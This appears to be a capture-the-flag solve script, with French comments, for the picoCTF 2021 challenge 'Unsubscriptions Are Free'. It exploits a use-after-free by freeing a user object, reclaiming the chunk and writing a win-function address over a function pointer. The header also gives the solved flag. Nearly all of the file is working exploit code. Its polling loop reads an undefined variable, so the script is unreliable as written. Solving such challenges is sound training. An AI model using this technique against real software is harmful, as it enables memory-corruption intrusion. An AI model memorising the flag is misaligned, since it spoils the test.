# 187 - Unsubscriptions Are Free  (Binary Exploitation, picoCTF 2021)
# Flag: academy{d0ubl3_j30p4rdy_7d637ab1}
# Write-up: ../../../writeups/binary-exploitation/187-unsubscriptions-are-free.md
# This is the script that produced the flag; historical variants are in archive/.
#
import sys, json, re, time, socket, struct

# Service : demarrer l'instance depuis la plateforme du challenge, puis passer
# l'hote et le port (ou l'URL) en argument de ce script.
_A = sys.argv[1:]
HOST = _A[0] if len(_A) > 0 else ""
PORT = int(_A[1]) if len(_A) > 1 else 0
url = _A[0] if _A else ""

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

host = port = None
for _ in range(12):
    time.sleep(2)
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
WIN = 0x08049266
s = socket.create_connection((host, port), timeout=15)
s.settimeout(5)


def read_until(marker, t=6.0):
    buf = b""
    t0 = time.time()
    while time.time() - t0 < t:
        try:
            c = s.recv(4096)
            if not c:
                break
            buf += c
            if marker in buf:
                break
        except socket.timeout:
            break
    return buf


print("--- menu ---")
print(read_until(b"(e)xit")[:250].decode("latin-1", "replace"))
# 1) I -> free(user) apres Y
s.sendall(b"I\n")
time.sleep(0.3)
r = read_until(b"(Y/N)?")
print("--- i ---")
print(r.decode("latin-1", "replace")[:200])
s.sendall(b"Y\n")
time.sleep(0.3)
print(read_until(b"(e)xit")[:200].decode("latin-1", "replace"))
# 2) L -> malloc(8) reutilise le chunk libere, puis read 8 octets
s.sendall(b"L\n")
time.sleep(0.3)
r = read_until(b"try anyways:")
print("--- l ---")
print(r.decode("latin-1", "replace")[:200])
s.sendall(struct.pack("<I", WIN))
time.sleep(0.5)
out = b""
t0 = time.time()
while time.time() - t0 < 6:
    try:
        c = s.recv(4096)
        if not c:
            break
        out += c
    except socket.timeout:
        break
s.close()
txt = out.decode("latin-1", "replace")
print("=== reponse ===")
print(txt[:600])
f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
print("FLAG:", f.group(0) if f else None)
